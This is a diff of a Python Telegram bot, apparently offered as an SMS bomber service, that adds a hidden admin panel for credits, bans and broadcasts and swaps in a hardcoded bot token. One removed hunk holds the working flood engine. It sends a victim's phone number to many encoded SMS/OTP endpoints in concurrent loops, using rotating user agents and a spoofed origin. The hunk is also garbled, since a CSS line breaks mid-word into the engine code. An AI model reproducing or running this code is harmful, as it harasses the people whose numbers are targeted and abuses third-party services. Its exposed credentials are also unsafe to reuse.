@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 # ============================================================
 #  MZ MINHAZ - SMS BOMBER (Premium UI + Hidden Admin Panel)
 #  Developer: MZ MINHAZ
@@ -36,7 +37,8 @@ from telegram.ext import (
 from telegram.constants import ParseMode
 
 # ============ CONFIG ============
-BOT_TOKEN          = os.environ.get("BOT_TOKEN", "8903303064:AAGEXI6s1Vt3kTyCN25CZlhHOoFY9qdJMj8")
+# আপনার টোকেনটি নিচের কোটেশনের ভেতরে বসান (কোনো স্পেস বা এন্টার ছাড়া)
+BOT_TOKEN          = os.environ.get("BOT_TOKEN", "8903303064:AAE9pEU_jevZRXyGRDx0tSAKHXBpXeezW_I")
 ADMIN_ID           = int(os.environ.get("ADMIN_ID", 8255204869))
 CHANNEL_URL        = "https://t.me/mz_creations_official"
 CHANNEL_USERNAME   = "@mz_creations_official"
@@ -327,327 +329,7 @@ HTML_TEMPLATE = r"""
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta name="theme-color" content="#000000">
-<title>MZ MINHAZ — Bomber</title>
-<script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>
-  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
-  :root {
-    --bg: #050608;
-    --panel: rgba(8, 20, 10, 0.72);
-    --border: rgba(0, 255, 65, 0.25);
-    --green: #00ff41;
-    --green-soft: #14a842;
-    --cyan: #00ffd0;
-    --red: #ff3b3b;
-    --red-soft: #a82222;
-    --yellow: #ffcc00;
-    --text: #d8ffe0;
-    --muted: #4a7a5a;
-    --shadow: 0 20px 60px rgba(0, 255, 65, 0.12);
-  }
-  html, body {
-    min-height: 100vh;
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    overflow-x: hidden;
-    overscroll-behavior: none;
-  }
-  #matrix {
-    position: fixed; inset: 0;
-    z-index: 0; pointer-events: none;
-    opacity: 0.55;
-  }
-  .bg-glow {
-    position: fixed; inset: 0; z-index: 0; pointer-events: none;
-    background:
-      radial-gradient(circle at 20% 10%, rgba(0,255,65,0.10) 0%, transparent 45%),
-      radial-gradient(circle at 80% 90%, rgba(0,255,208,0.08) 0%, transparent 50%);
-  }
-
-  /* ====== LOADER ====== */
-  #loader {
-    position: fixed; inset: 0; z-index: 9999;
-    display: flex; flex-direction: column; align-items: center; justify-content: center;
-    background: var(--bg); gap: 24px;
-    transition: opacity .5s ease;
-  }
-  #loader.hide { opacity: 0; pointer-events: none; }
-  .spinner {
-    width: 56px; height: 56px;
-    border: 3px solid rgba(0,255,65,0.15);
-    border-top-color: var(--green);
-    border-radius: 50%;
-    animation: spin 0.9s linear infinite;
-    box-shadow: 0 0 30px rgba(0,255,65,0.3);
-  }
-  @keyframes spin { to { transform: rotate(360deg); } }
-  .load-text {
-    font-family: 'Courier New', monospace;
-    color: var(--green);
-    letter-spacing: 4px;
-    font-size: 12px;
-    font-weight: 700;
-    animation: blink 1.4s infinite;
-  }
-  @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
-
-  /* ====== APP ====== */
-  .app {
-    position: relative; z-index: 2;
-    max-width: 480px;
-    margin: 0 auto;
-    padding: 20px 18px 100px;
-    min-height: 100vh;
-    display: flex; flex-direction: column; gap: 18px;
-  }
-
-  /* ====== HEADER ====== */
-  .top-bar {
-    display: flex; justify-content: space-between; align-items: center;
-  }
-  .credits-pill {
-    display: flex; align-items: center; gap: 8px;
-    padding: 10px 16px;
-    background: linear-gradient(135deg, rgba(0,255,65,0.15), rgba(0,255,208,0.08));
-    border: 1px solid var(--border);
-    border-radius: 100px;
-    backdrop-filter: blur(20px);
-    box-shadow: 0 8px 30px rgba(0,255,65,0.15);
-  }
-  .credits-pill .icon { font-size: 18px; }
-  .credits-pill .val {
-    font-family: 'Courier New', monospace;
-    font-weight: 800;
-    font-size: 18px;
-    color: var(--green);
-    text-shadow: 0 0 20px rgba(0,255,65,0.6);
-    min-width: 20px;
-    transition: transform .3s;
-  }
-  .credits-pill .val.bump { transform: scale(1.35); }
-  .credits-pill .lbl {
-    font-size: 10px;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    font-weight: 700;
-  }
-  .close-btn {
-    width: 42px; height: 42px;
-    display: flex; align-items: center; justify-content: center;
-    background: rgba(255,59,59,0.08);
-    border: 1px solid rgba(255,59,59,0.3);
-    border-radius: 50%;
-    color: var(--red);
-    font-size: 20px;
-    cursor: pointer;
-    transition: all .2s;
-  }
-  .close-btn:active { transform: scale(0.9); background: rgba(255,59,59,0.2); }
-
-  /* ====== BRAND ====== */
-  .brand { text-align: center; padding: 8px 0 6px; }
-  .brand h1 {
-    font-family: 'Courier New', monospace;
-    font-size: 34px;
-    font-weight: 900;
-    color: var(--green);
-    letter-spacing: 4px;
-    text-shadow:
-      0 0 10px rgba(0,255,65,0.8),
-      0 0 30px rgba(0,255,65,0.5),
-      0 0 60px rgba(0,255,65,0.3);
-    animation: glow 3s ease-in-out infinite;
-  }
-  @keyframes glow {
-    0%,100% { text-shadow: 0 0 10px rgba(0,255,65,0.8), 0 0 30px rgba(0,255,65,0.5), 0 0 60px rgba(0,255,65,0.3); }
-    50% { text-shadow: 0 0 20px rgba(0,255,65,1), 0 0 50px rgba(0,255,65,0.7), 0 0 90px rgba(0,255,65,0.5); }
-  }
-  .brand .tagline {
-    font-size: 11px;
-    letter-spacing: 5px;
-    color: var(--muted);
-    text-transform: uppercase;
-    margin-top: 6px;
-    font-weight: 600;
-  }
-  .brand .divider {
-    height: 1px; width: 60px; margin: 14px auto 0;
-    background: linear-gradient(90deg, transparent, var(--green), transparent);
-    box-shadow: 0 0 15px var(--green);
-  }
-
-  /* ====== CARD ====== */
-  .card {
-    background: var(--panel);
-    backdrop-filter: blur(24px);
-    -webkit-backdrop-filter: blur(24px);
-    border: 1px solid var(--border);
-    border-radius: 24px;
-    padding: 22px 20px;
-    box-shadow: var(--shadow), inset 0 1px 0 rgba(255,255,255,0.03);
-    position: relative;
-    overflow: hidden;
-  }
-  .card::before {
-    content: '';
-    position: absolute; top: 0; left: -100%;
-    width: 100%; height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(0,255,65,0.05), transparent);
-    animation: shine 8s infinite;
-  }
-  @keyframes shine {
-    0% { left: -100%; }
-    50%,100% { left: 100%; }
-  }
-
-  .label {
-    display: flex; align-items: center; gap: 8px;
-    font-size: 11px;
-    color: var(--muted);
-    text-transform: uppercase;
-    letter-spacing: 2px;
-    font-weight: 700;
-    margin-bottom: 12px;
-  }
-  .label .ico { font-size: 15px; filter: drop-shadow(0 0 6px rgba(0,255,65,0.5)); }
-
-  /* ====== PHONE INPUT ====== */
-  .phone-wrap {
-    position: relative;
-    display: flex; align-items: center;
-    background: rgba(0, 20, 5, 0.7);
-    border: 1.5px solid rgba(0,255,65,0.3);
-    border-radius: 16px;
-    padding: 4px 6px;
-    transition: all .25s;
-  }
-  .phone-wrap:focus-within {
-    border-color: var(--green);
-    box-shadow: 0 0 0 3px rgba(0,255,65,0.12), 0 0 30px rgba(0,255,65,0.25);
-  }
-  .phone-prefix {
-    padding: 12px 14px;
-    color: var(--green);
-    font-family: 'Courier New', monospace;
-    font-weight: 800;
-    font-size: 16px;
-    border-right: 1px solid rgba(0,255,65,0.2);
-    margin-right: 4px;
-  }
-  #phone {
-    flex: 1;
-    background: transparent;
-    border: none;
-    outline: none;
-    color: var(--text);
-    font-family: 'Courier New', monospace;
-    font-size: 17px;
-    font-weight: 700;
-    letter-spacing: 2px;
-    padding: 12px 8px;
-    width: 100%;
-  }
-  #phone::placeholder { color: var(--muted); letter-spacr k, v in payload.items():
-        if isinstance(v, str) and v in pd:
-            out[k] = pd[v]
-        else:
-            out[k] = v
-    return out
-
-async def _hit(session, api, pd, key, state_dict, lock):
-    with lock:
-        st = state_dict.get(key)
-        if not st or st.get('stop_flag'): return
-
-    ok = False
-    try:
-        url = bd(api[1])
-        data = _render_payload(api[2], pd)
-        headers = {
-            "User-Agent": random.choice(USER_AGENTS),
-            "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "Accept-Language": "en-US,en;q=0.9,bn;q=0.8",
-            "Accept-Encoding": "gzip, deflate",
-            "Connection": "keep-alive",
-            "x-requested-with": "mark.via.gp",
-            "Origin": "https://www.google.com",
-            "Referer": "https://www.google.com/"
-        }
-        if not data:
-            async with session.get(url, headers=headers, ssl=_ssl, timeout=7) as r:
-                ok = r.status in (200, 201, 202, 204, 302)
-        else:
-            async with session.post(url, headers=headers, json=data, ssl=_ssl, timeout=7) as r:
-                ok = r.status in (200, 201, 202, 204, 302)
-    except:
-        ok = False
-    finally:
-        with lock:
-            st = state_dict.get(key)
-            if st:
-                st['total'] += 1
-                if ok: st['ok'] += 1
-                else:  st['fail'] += 1
-
-async def _cycle(session, pd, key, state_dict, lock):
-    tasks = []
-    for api in APIS:
-        with lock:
-            st = state_dict.get(key)
-            if not st or st.get('stop_flag'): break
-        tasks.append(_hit(session, api, pd, key, state_dict, lock))
-    if tasks:
-        for i in range(0, len(tasks), 3):
-            batch = tasks[i:i+3]
-            await asyncio.gather(*batch, return_exceptions=True)
-            await asyncio.sleep(0.02)
-
-async def _runner(phone, delay, key, state_dict, lock, end_time=None):
-    pd = fmtnum(phone)
-    timeout = aiohttp.ClientTimeout(total=10, connect=5)
-    connector = aiohttp.TCPConnector(limit=2000, limit_per_host=500, ssl=_ssl, enable_cleanup_closed=True)
-    try:
-        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-            while True:
-                with lock:
-                    st = state_dict.get(key)
-                    if not st or st.get('stop_flag'): break
-                if end_time and time.time() >= end_time:
-                    break
-                await _cycle(session, pd, key, state_dict, lock)
-                if delay > 0:
-                    await asyncio.sleep(delay)
-    finally:
-        with lock:
-            st = state_dict.get(key)
-            if st: st['running'] = False
-
-def _spawn(phone, speed, key, state_dict, lock, end_time=None):
-    delay_map = {'fast': 0.0, 'medium': 0.15, 'slow': 0.4}
-    delay = delay_map.get(speed, 0.15)
-    def worker():
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        try:
-            loop.run_until_complete(_runner(phone, delay, key, state_dict, lock, end_time))
-        finally:
-            loop.close()
-    threading.Thread(target=worker, daemon=True).start()
-
-# ============ FLASK PANEL ============
-app = Flask(__name__)
-
-HTML_TEMPLATE = r"""
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<meta name="theme-color" content="#000000">
-<title>MZ MINHAZ — Bomber</title>
+<title>MZ MINHAZ - Bomber</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
@@ -1380,13 +1062,8 @@ HTML_TEMPLATE = r"""
 
   // ===== STATE =====
   const state = {
-    phone: '',
-    speed: 'medium',
-    running: false,
-    credits: 0,
-    endTime: 0,
-    total: 0, ok: 0, fail: 0,
-    lastTotal: 0, lastOk: 0, lastFail: 0,
+    phone: '', speed: 'medium', running: false,
+    credits: 0, endTime: 0, total: 0, ok: 0, fail: 0
   };
 
   // ===== HAPTIC =====
@@ -1796,11 +1473,17 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"🔗 Referral link:\n`{ref_link}`\n\n"
         f"📢 Channel: {CHANNEL_URL}"
     )
+    
     kb = [
         [InlineKeyboardButton("🚀 Start Bombing (Web Panel)", web_app=WebAppInfo(url=WEBAPP_URL))],
         [InlineKeyboardButton("📢 Channel", url=CHANNEL_URL),
          InlineKeyboardButton("💎 Balance", callback_data="balance")]
     ]
+    
+    # Only show this to Admin
+    if chat_id == ADMIN_ID:
+        kb.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
+        
     await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
 
 async def cmd_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1840,6 +1523,155 @@ async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await q.message.reply_text(f"💎 *Balance:* {row[1] if row else 0} credits", parse_mode=ParseMode.MARKDOWN)
         return
 
+# ============ ADMIN PANEL LOGIC ============
+async def _show_admin_panel(update_or_query, edit=False):
+    kb = [
+        [InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
+         InlineKeyboardButton("👥 User Info", callback_data="admin_userinfo")],
+        [InlineKeyboardButton("➕ Add Credits", callback_data="admin_add"),
+         InlineKeyboardButton("➖ Remove Credits", callback_data="admin_remove")],
+        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
+         InlineKeyboardButton("🚫 Ban", callback_data="admin_ban"),
+         InlineKeyboardButton("✅ Unban", callback_data="admin_unban")],
+        [InlineKeyboardButton("🔙 Close", callback_data="admin_close")]
+    ]
+    text = (
+        f"👑 *Admin Panel - {DEVELOPER_NAME}*\n\n"
+        f"Use buttons below to manage the bot."
+    )
+    if edit and hasattr(update_or_query, "edit_message_text"):
+        await update_or_query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
+    else:
+        msg = update_or_query.message if hasattr(update_or_query, "message") else update_or_query
+        await msg.reply_text(text, parse_mode=ParseMode.MARKDOWN, reply_markup=InlineKeyboardMarkup(kb))
+
+async def _handle_admin_input(update, context, action, txt):
+    context.user_data["admin_action"] = None
+
+    if action == "add":
+        parts = txt.split()
+        if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
+            await update.message.reply_text("❌ Format: `<chat_id> <amount>`", parse_mode=ParseMode.MARKDOWN)
+            return
+        target, amt = int(parts[0]), int(parts[1])
+        if not user_exists(target):
+            await update.message.reply_text("❌ User not found.")
+            return
+        credits_add(target, amt)
+        row = user_get(target)
+        await update.message.reply_text(f"✅ Added {amt} credits to `{target}`. New balance: {row[1]}", parse_mode=ParseMode.MARKDOWN)
+
+    elif action == "remove":
+        parts = txt.split()
+        if len(parts) != 2 or not parts[0].isdigit() or not parts[1].isdigit():
+            await update.message.reply_text("❌ Format: `<chat_id> <amount>`", parse_mode=ParseMode.MARKDOWN)
+            return
+        target, amt = int(parts[0]), int(parts[1])
+        if not user_exists(target):
+            await update.message.reply_text("❌ User not found.")
+            return
+        credits_add(target, -amt)
+        row = user_get(target)
+        await update.message.reply_text(f"✅ Removed {amt} from `{target}`. New balance: {row[1]}", parse_mode=ParseMode.MARKDOWN)
+
+    elif action == "userinfo":
+        if not txt.isdigit():
+            await update.message.reply_text("❌ Send a numeric chat_id.")
+            return
+        row = user_get(int(txt))
+        if not row:
+            await update.message.reply_text("❌ User not found.")
+            return
+        await update.message.reply_text(
+            f"👤 *User Info*\n\n"
+            f"🆔 `{row[0]}`\n"
+            f"💎 Credits: {row[1]}\n"
+            f"👥 Referred by: {row[2]}\n"
+            f"🚫 Banned: {row[3]}\n"
+            f"⚔️ Attacks: {row[5]}",
+            parse_mode=ParseMode.MARKDOWN
+        )
+
+    elif action == "ban":
+        if not txt.isdigit():
+            await update.message.reply_text("❌ Send a numeric chat_id.")
+            return
+        db_query("UPDATE users SET banned=1 WHERE chat_id=?", (int(txt),))
+        await update.message.reply_text(f"🚫 Banned `{txt}`", parse_mode=ParseMode.MARKDOWN)
+
+    elif action == "unban":
+        if not txt.isdigit():
+            await update.message.reply_text("❌ Send a numeric chat_id.")
+            return
+        db_query("UPDATE users SET banned=0 WHERE chat_id=?", (int(txt),))
+        await update.message.reply_text(f"✅ Unbanned `{txt}`", parse_mode=ParseMode.MARKDOWN)
+
+    elif action == "broadcast":
+        rows = db_query("SELECT chat_id FROM users", fetch=True)
+        sent = 0; failed = 0
+        for r in rows:
+            try:
+                await context.bot.send_message(r[0], f"📢 *Announcement*\n\n{txt}", parse_mode=ParseMode.MARKDOWN)
+                sent += 1
+            except Exception:
+                failed += 1
+            await asyncio.sleep(0.05)
+        await update.message.reply_text(f"📢 Broadcast done.\n✅ Sent: {sent} | ❌ Failed: {failed}")
+
+async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not update.message or not update.message.text:
+        return
+    user = update.effective_user
+    action = context.user_data.get("admin_action")
+    if action and user.id == ADMIN_ID:
+        txt = update.message.text.strip()
+        await _handle_admin_input(update, context, action, txt)
+        return
+
+async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    q = update.callback_query
+    await q.answer()
+    data = q.data
+    user = q.from_user
+
+    if user.id != ADMIN_ID:
+        await q.answer("❌ Unauthorized Access!", show_alert=True)
+        return
+
+    if data == "admin_panel":
+        await _show_admin_panel(q, edit=True)
+        return
+
+    if data == "admin_stats":
+        users = db_query("SELECT COUNT(*), SUM(credits), SUM(total_attacks) FROM users", fetch=True)[0]
+        active = len([k for k, v in bot_attacks.items() if v.get("running")])
+        await q.edit_message_text(
+            f"📊 *Bot Stats*\n\n"
+            f"👥 Users: {users[0] or 0}\n"
+            f"💎 Total credits: {users[1] or 0}\n"
+            f"⚔️ Total attacks: {users[2] or 0}\n"
+            f"🔥 Active attacks: {active}",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]])
+        )
+    elif data in ("admin_add", "admin_remove", "admin_userinfo", "admin_ban", "admin_unban", "admin_broadcast"):
+        prompts = {
+            "admin_add": ("add", "➕ Send: `<chat_id> <amount>`", ParseMode.MARKDOWN),
+            "admin_remove": ("remove", "➖ Send: `<chat_id> <amount>`", ParseMode.MARKDOWN),
+            "admin_userinfo": ("userinfo", "👤 Send the user's chat_id:", None),
+            "admin_ban": ("ban", "🚫 Send chat_id to ban:", None),
+            "admin_unban": ("unban", "✅ Send chat_id to unban:", None),
+            "admin_broadcast": ("broadcast", "📢 Send the broadcast message:", None),
+        }
+        act, prompt, mode = prompts[data]
+        context.user_data["admin_action"] = act
+        await q.edit_message_text(prompt, parse_mode=mode,
+                                  reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Cancel", callback_data="admin_back")]]))
+    elif data == "admin_back":
+        await _show_admin_panel(q, edit=True)
+    elif data == "admin_close":
+        await q.edit_message_text("👑 Admin panel closed.")
+
 async def post_init(app: Application):
     global BOT_USERNAME
     me = await app.bot.get_me()
@@ -1872,12 +1704,22 @@ def main():
         WEBAPP_URL, tunnel_process = start_cloudflare_tunnel(port)
     else:
         print(f"[boot] Using WEBAPP_URL: {WEBAPP_URL}")
+    
     application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+    
+    # Basic Commands
     application.add_handler(CommandHandler("start", cmd_start))
     application.add_handler(CommandHandler("balance", cmd_balance))
     application.add_handler(CommandHandler("credits", cmd_balance))
     application.add_handler(CommandHandler("refer", cmd_refer))
-    application.add_handler(CallbackQueryHandler(callback_handler))
+    
+    # Callbacks
+    application.add_handler(CallbackQueryHandler(callback_handler, pattern="^(check_join|balance)$"))
+    application.add_handler(CallbackQueryHandler(admin_callback_handler, pattern="^admin_"))
+    
+    # Message Handler for Admin inputs
+    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
+    
     try:
         application.run_polling(allowed_updates=Update.ALL_TYPES)
     finally:
